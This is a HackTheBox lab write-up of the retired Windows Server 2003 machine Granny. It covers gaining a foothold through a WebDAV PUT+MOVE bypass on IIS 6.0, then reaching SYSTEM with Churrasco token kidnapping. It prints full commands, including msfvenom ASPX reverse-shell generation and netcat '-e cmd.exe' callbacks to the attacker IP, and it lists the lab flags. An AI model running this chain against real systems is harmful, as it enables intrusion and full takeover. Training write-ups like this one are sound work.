# Granny — HackTheBox

| Field | Details |
|-------|---------|
| Platform | HackTheBox |
| Machine | Granny |
| OS | Windows (Windows Server 2003 SP2) |
| Difficulty | Easy |
| Attacker IP | `10.10.16.36` |
| Target IP | `10.129.95.234` |
| Tools Used | Nmap, msfvenom, cadaver, netcat, churrasco.exe |
| CVEs | CVE-2008-1436 (Token Kidnapping via RPCSS — Windows Server 2003 unpatched `SeImpersonatePrivilege` → SYSTEM) |
| Date | October 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Reconnaissance](#reconnaissance)
- [Foothold — WebDAV PUT+MOVE Extension Bypass](#foothold--webdav-putmove-extension-bypass)
- [Post-Exploitation Enumeration](#post-exploitation-enumeration)
- [Privilege Escalation — Token Kidnapping via Churrasco (CVE-2008-1436)](#privilege-escalation--token-kidnapping-via-churrasco-cve-2008-1436)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [Tool Reference](#tool-reference)
- [MITRE ATT\&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|----------|
| 1 | Nmap full-port + service-version scan | Port 80 only — Microsoft IIS 6.0 with WebDAV enabled |
| 2 | Nmap WebDAV method scan | PUT, MOVE, COPY, DELETE all allowed — upload vector confirmed |
| 3 | msfvenom — generate ASPX reverse shell | `shell.aspx` created (x86 Windows reverse TCP, 2724 bytes) |
| 4 | cadaver — attempt direct PUT of `shell.aspx` | Blocked: 403 Forbidden — `.aspx` extension restricted |
| 5 | WebDAV PUT+MOVE bypass — upload as `.txt`, rename via MOVE | `shell.txt` uploaded → renamed to `shell.aspx` → succeeded |
| 6 | Trigger shell via HTTP GET on `shell.aspx` | Reverse shell caught — `nt authority\network service` |
| 7 | `whoami /all` — privilege and token enumeration | `SeImpersonatePrivilege` is **Enabled** |
| 8 | `systeminfo` — OS and patch level | Windows Server 2003 SP2, only 1 hotfix installed |
| 9 | Upload `nc.exe` and `churrasco.exe` via WebDAV PUT+MOVE | Both binaries placed in `C:\Inetpub\wwwroot\` |
| 10 | `churrasco.exe "whoami > test.txt"` — confirm SYSTEM execution | `nt authority\system` confirmed via test file |
| 11 | `churrasco.exe "nc.exe -e cmd.exe 10.10.16.36 4444"` | SYSTEM-level reverse shell established |
| 12 | Flags read from Lakis and Administrator desktops | `user.txt` and `root.txt` captured |

---

## Reconnaissance

### Step 1 — Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -Pn --open -p- -T4 10.129.95.234
```

```
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 299.34 seconds
```

Only **one port** open across all 65535. Port 80 is the sole attack surface. The high number of `filtered` ports is characteristic of a Windows firewall dropping inbound packets. Everything runs through HTTP.

---

### Step 2 — Service Version and WebDAV Enumeration

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -sS -sV -sC -T4 -O -p 80 -Pn 10.129.95.234 -oA Granny
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan:
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK

OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (88%)
```

**IIS 6.0** shipped with Windows Server 2003 — EOL since 2015, unpatched for over a decade. **WebDAV** adds file management via HTTP (upload, rename, delete). The combination of `PUT` + `MOVE` is the attack: IIS 6.0 blocks direct upload of executable extensions (`.aspx`) via `PUT`, but does not block `MOVE` from renaming an already-uploaded `.txt` to `.aspx`.

| Method | Attack Use |
|--------|-----------|
| `PUT` | Upload file with safe extension (`.txt`) |
| `MOVE` | Rename to `.aspx` after upload (no re-check) |

> **Key concept:** The extension filter on `PUT` is security theatre if `MOVE` is unrestricted. The bypass is one cadaver session away.

---

## Foothold — WebDAV PUT+MOVE Extension Bypass

### Step 3 — Generate ASPX Reverse Shell

IIS 6.0 on Windows Server 2003 is x86 — the payload must be 32-bit:

```bash
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.16.36 \
  LPORT=4444 \
  -f aspx \
  -o shell.aspx
```

```
Payload size: 324 bytes
Final size of aspx file: 2724 bytes
Saved as: shell.aspx
```

`windows/shell_reverse_tcp` generates a native `cmd.exe` shell over TCP — caught with `nc`, no Metasploit handler needed. `-f aspx` wraps the shellcode in an ASP.NET page that IIS executes on request.

---

### Step 4 — Direct PUT Blocked

```bash
dav:/> put shell.aspx
Uploading shell.aspx to `/shell.aspx':
Progress: [=============================>] 100.0% of 2724 bytes failed:
403 Forbidden
```

IIS 6.0 blocks `PUT` for `.aspx`. The filter runs at `PUT` time only — it does not monitor subsequent `MOVE` operations.

---

### Step 5 — PUT+MOVE Bypass

```bash
Hackerpatel007_1@htb[/htb]$ cadaver http://10.129.95.234/
```

```
dav:/> put shell.txt
Uploading shell.txt to `/shell.txt':
Progress: [=============================>] 100.0% of 2724 bytes succeeded.

dav:/> move shell.txt shell.aspx
Moving `/shell.txt' to `/shell.aspx': succeeded.

dav:/> exit
```

- `put shell.txt` — ASPX shellcode uploaded with a `.txt` extension; the filter passes it.
- `move shell.txt shell.aspx` — HTTP `MOVE` request renames the file server-side; IIS does not re-check the extension.
- `/shell.aspx` now exists in the webroot and will execute as ASP.NET.

---

### Step 6 — Catch the Reverse Shell

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
Hackerpatel007_1@htb[/htb]$ curl -s http://10.129.95.234/shell.aspx
```

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.95.234] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>
```

Shell as `NETWORK SERVICE` — the IIS worker process identity.

---

## Post-Exploitation Enumeration

### Step 7 — Privilege Audit

```cmd
c:\windows\system32\inetsrv> whoami /all
```

```
USER INFORMATION
User Name: nt authority\network service

PRIVILEGES INFORMATION
Privilege Name                Description                               State
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

**`SeImpersonatePrivilege: Enabled`** — the key finding. This privilege allows a process to adopt the security token of another user, including `SYSTEM`. IIS worker processes hold this by design for per-request impersonation. On Windows Server 2003 without MS09-012, it allows stealing the SYSTEM token from RPCSS threads.

---

### Step 8 — OS and Patch Level

```cmd
c:\windows\system32\inetsrv> systeminfo
```

```
OS Name:    Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version: 5.2.3790 Service Pack 2 Build 3790
System Type: X86-based PC
Hotfix(s):  1 Hotfix(s) Installed.
            [01]: Q147222
```

| Detail | Value | Significance |
|--------|-------|-------------|
| OS | Windows Server 2003 SP2 | EOL July 2015 — unpatched for 11+ years |
| Hotfixes | **1 installed** | MS09-012 (Token Kidnapping patch) is **missing** |
| Architecture | x86 (32-bit) | 32-bit exploit binaries required |

One hotfix installed means MS09-012 is absent — Token Kidnapping is viable. This also determines the tool: **Churrasco** is the Windows 2003-era exploit. JuicyPotato and PrintSpoofer require COM/DCOM infrastructure not present on 2003.

---

## Privilege Escalation — Token Kidnapping via Churrasco (CVE-2008-1436)

### How Token Kidnapping Works

The RPCSS service (`svchost.exe -k rpcss`) runs as SYSTEM and manages a thread pool. Some threads are impersonating SYSTEM-level callers and hold SYSTEM impersonation tokens. Churrasco:

1. Locates the RPCSS process (PID scan)
2. Walks RPCSS threads looking for one impersonating SYSTEM
3. Duplicates that thread’s SYSTEM impersonation token
4. Calls `CreateProcessWithToken()` with the stolen SYSTEM token
5. The command passed as argument runs as SYSTEM

MS09-012 (April 2009) fixed this by restricting `NETWORK SERVICE` from opening SYSTEM-impersonating RPCSS thread handles. That patch is absent here.

---

### Step 9 — Transfer Binaries via WebDAV

Same PUT+MOVE bypass technique used for the shell:

```bash
Hackerpatel007_1@htb[/htb]$ cp churrasco.exe churrasco.txt
Hackerpatel007_1@htb[/htb]$ cp nc.exe nc.txt
```

```bash
Hackerpatel007_1@htb[/htb]$ cadaver http://10.129.95.234/
```

```
dav:/> put churrasco.txt
Progress: [=============================>] 100.0% of 31232 bytes succeeded.
dav:/> move churrasco.txt churrasco.exe
Moving `/churrasco.txt' to `/churrasco.exe': succeeded.

dav:/> put nc.txt
Progress: [=============================>] 100.0% of 59392 bytes succeeded.
dav:/> move nc.txt nc.exe
Moving `/nc.txt' to `/nc.exe': succeeded.
dav:/> exit
```

```cmd
C:\Inetpub\wwwroot> dir
10/30/2026  11:23 AM    31,232 churrasco.exe
10/30/2026  10:48 AM    59,392 nc.exe
10/30/2026  10:16 AM     2,724 shell.aspx
```

Both binaries land in `C:\Inetpub\wwwroot\` — writable by NETWORK SERVICE.

---

### Step 10 — Verify SYSTEM Execution

```cmd
C:\Inetpub\wwwroot> churrasco.exe "whoami > C:\Inetpub\wwwroot\test.txt"
C:\Inetpub\wwwroot> type test.txt
nt authority\system
```

`nt authority\system` confirmed. Churrasco successfully kidnapped the SYSTEM token.

---

### Step 11 — Read Flags via Churrasco

```cmd
C:\Inetpub\wwwroot> churrasco.exe "type C:\DOCUME~1\Lakis\DESKTOP\user.txt > C:\temp\user.txt"
C:\temp> type user.txt
700c5dc163014e22b3e408f8703f67d1
```

```cmd
C:\Inetpub\wwwroot> churrasco.exe "type C:\DOCUME~1\ADMINI~1\DESKTOP\root.txt > C:\temp\root.txt"
C:\temp> type root.txt
aa4beed1c0584445ab463a6747bd06e9
```

> **Note on paths:** `C:\DOCUME~1\ADMINI~1\DESKTOP\` is the 8.3 short filename for `C:\Documents and Settings\Administrator\Desktop\`. Windows Server 2003 uses the legacy `Documents and Settings` path structure. 8.3 short names avoid the quoting issues from spaces in path names — `dir /x` lists both forms.

---

### Step 12 — Full SYSTEM Interactive Shell

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
```

```cmd
c:\windows\system32\inetsrv> C:\Inetpub\wwwroot\churrasco.exe "C:\Inetpub\wwwroot\nc.exe -e cmd.exe 10.10.16.36 4444"
```

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.95.234] 1041

C:\WINDOWS\TEMP> whoami
nt authority\system
```

Full interactive SYSTEM shell. Churrasco spawns child processes from `C:\Windows\Temp` by default.

---

## Flags

| Flag | File | Value |
|------|------|-------|
| User | `C:\Documents and Settings\Lakis\Desktop\user.txt` | `700c5dc163014e22b3e408f8703f67d1` |
| Root | `C:\Documents and Settings\Administrator\Desktop\root.txt` | `aa4beed1c0584445ab463a6747bd06e9` |

---

## Lessons Learned

1. **WebDAV enabled on IIS 6.0 with unrestricted `PUT` and `MOVE` is a direct path to RCE with no credentials.** The `http-webdav-scan` section of Nmap output listed every dangerous method in one line. Any assessment returning `PUT` and `MOVE` in the allowed WebDAV methods should immediately be treated as a file upload vector. The extension filter blocking `.aspx` on `PUT` is security theatre if `MOVE` is unrestricted.

2. **The WebDAV PUT+MOVE bypass is a two-stage logic gap.** IIS 6.0 checks the extension at `PUT` time but not on `MOVE`. Upload with `.txt`, rename to `.aspx` — the file executes normally. The fix: disable `MOVE` and `COPY`, or restrict WebDAV to authenticated users with filesystem-level extension policy.

3. **`SeImpersonatePrivilege` on Windows is the single most important privilege to check after getting a shell.** When `whoami /all` shows it enabled, privilege escalation to SYSTEM is almost always achievable. The right tool depends on OS version: Churrasco (Windows 2003), JuicyPotato (Windows 2008–2016), PrintSpoofer / GodPotato (Windows 2019/10/2022).

4. **Churrasco is the correct impersonation exploit for Windows Server 2003 — not JuicyPotato or PrintSpoofer.** JuicyPotato needs DCOM/CLSID infrastructure not present on 2003. PrintSpoofer abuses the Print Spooler named pipe, also unavailable. Churrasco attacks RPCSS directly, which has existed since NT 4.0. The `systeminfo` showing only 1 hotfix (`Q147222`) is the indicator MS09-012 is missing.

5. **Binary transfer via WebDAV PUT+MOVE works for any file type.** The same technique that uploaded the shell was used for `churrasco.exe` and `nc.exe`. Any binary uploads as `.txt` and renames back to `.exe`. This is a reliable transfer method when no FTP, SMB, or curl exists on the target.

6. **Always verify privilege escalation exploits with a safe command before executing a reverse shell.** `churrasco.exe "whoami > test.txt"` confirmed SYSTEM output before network callback. A file-write test costs nothing and proves the escalation before exposing the callback.

7. **The 8.3 short filename convention is essential for navigating Windows Server 2003 paths in restricted shells.** `DOCUME~1` for `Documents and Settings`, `ADMINI~1` for the first folder starting with `Admini`. In any Windows shell where spaces in paths cause problems, `dir /x` lists both long and short names.

8. **Windows Server 2003 with 1 hotfix is an entirely unpatched attack surface.** MS09-012 (Token Kidnapping), MS14-058, MS15-051, and hundreds more are all absent. When `systeminfo` shows fewer than 10 hotfixes on any Server 2003 system, assume every known local privesc from 2003–2015 is available.

---

## Full Attack Chain Reference

```
[Attacker: 10.10.16.36]
        ↓
Nmap: port 80 only — Microsoft IIS 6.0
WebDAV enabled: PUT, MOVE, COPY, DELETE all allowed
        ↓
msfvenom: windows/shell_reverse_tcp x86 → shell.aspx (2724 bytes)
        ↓
cadaver PUT shell.aspx → 403 Forbidden (extension filter blocks .aspx)
        ↓
WebDAV PUT+MOVE Bypass:
  cadaver PUT shell.txt → succeeded (safe extension accepted)
  cadaver MOVE shell.txt → shell.aspx → succeeded (no re-check on rename)
        ↓
nc -lvnp 4444 → curl http://10.129.95.234/shell.aspx
        ↓
Reverse shell: nt authority\network service [Initial Foothold]
        ↓
whoami /all: SeImpersonatePrivilege: Enabled ← CRITICAL
systeminfo: Windows Server 2003 SP2, 1 hotfix only
  → MS09-012 NOT installed → Churrasco is the correct exploit
        ↓
cadaver: upload nc.txt → nc.exe, churrasco.txt → churrasco.exe
        ↓
churrasco.exe "whoami > test.txt" → nt authority\system ✓
        ↓
churrasco.exe "type C:\DOCUME~1\Lakis\DESKTOP\user.txt > C:\temp\user.txt"
[User Flag: 700c5dc163014e22b3e408f8703f67d1]
        ↓
churrasco.exe "type C:\DOCUME~1\ADMINI~1\DESKTOP\root.txt > C:\temp\root.txt"
[Root Flag: aa4beed1c0584445ab463a6747bd06e9]
        ↓
churrasco.exe "nc.exe -e cmd.exe 10.10.16.36 4444"
→ nc -lvnp 4444 → nt authority\system interactive shell
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `sudo nmap -Pn --open -p- -T4 10.129.95.234` | Full TCP port scan |
| `sudo nmap -sS -sV -sC -T4 -O -p 80 -Pn 10.129.95.234 -oA Granny` | Service version, WebDAV scan, OS detection |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.36 LPORT=4444 -f aspx -o shell.aspx` | Generate x86 ASPX reverse shell |
| `cadaver http://10.129.95.234/` | Connect to WebDAV server interactively |
| `put shell.txt` | Upload shell content with safe `.txt` extension |
| `move shell.txt shell.aspx` | Rename to executable extension (no re-check) |
| `nc -lvnp 4444` | Start reverse shell listener |
| `curl -s http://10.129.95.234/shell.aspx` | Trigger the uploaded ASPX shell |
| `whoami /all` | Enumerate user context, groups, and privileges |
| `systeminfo` | OS version, patch level, architecture |
| `cp churrasco.exe churrasco.txt` | Rename binary for WebDAV upload bypass |
| `churrasco.exe "whoami > C:\Inetpub\wwwroot\test.txt"` | Verify SYSTEM token execution |
| `churrasco.exe "type C:\DOCUME~1\Lakis\DESKTOP\user.txt > C:\temp\user.txt"` | Exfil user flag as SYSTEM |
| `churrasco.exe "type C:\DOCUME~1\ADMINI~1\DESKTOP\root.txt > C:\temp\root.txt"` | Exfil root flag as SYSTEM |
| `churrasco.exe "C:\Inetpub\wwwroot\nc.exe -e cmd.exe 10.10.16.36 4444"` | Spawn SYSTEM interactive reverse shell |

---

## Tool Reference

| Tool | Purpose | Why Used Here |
|------|---------|---------------|
| `cadaver` | Interactive WebDAV client | Upload files and rename via MOVE — cleaner than raw curl for multi-step operations |
| `msfvenom` | Payload generator (standalone) | Generates ASPX shellcode; `-f aspx` wraps shellcode in ASP.NET format for IIS |
| `netcat (nc)` | TCP listener and shell relay | Catches reverse shell; `nc.exe -e cmd.exe` pipes SYSTEM shell to attacker |
| `churrasco.exe` | Token Kidnapping exploit for Windows Server 2003 | Steals SYSTEM token from RPCSS threads — correct tool for pre-Vista Windows with `SeImpersonatePrivilege` |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|--------------|
| T1595 | T1595.001 | Nmap full-port scan + WebDAV method enumeration |
| T1190 | — | WebDAV PUT+MOVE extension bypass on IIS 6.0 — upload ASPX shell via `.txt` rename |
| T1505 | T1505.003 | `shell.aspx` deployed to `C:\Inetpub\wwwroot\` via WebDAV; triggered via HTTP GET |
| T1059 | T1059.003 | `cmd.exe` spawned via ASPX web shell and via `nc.exe -e cmd.exe` for SYSTEM shell |
| T1082 | — | `whoami /all` and `systeminfo` — user context, privileges, patch level |
| T1105 | — | `churrasco.exe` and `nc.exe` transferred via WebDAV PUT+MOVE |
| T1134 | T1134.001 | Churrasco (CVE-2008-1436) steals SYSTEM impersonation token from RPCSS threads |
| T1068 | — | CVE-2008-1436 Token Kidnapping — NETWORK SERVICE → SYSTEM via unpatched RPCSS |
| T1083 | — | `C:\Documents and Settings\` enumeration to locate user profile directories |

*HackTheBox retired machine — writeup published after official retirement.*  
*Penetration Tester role in India | Target: January 2027*
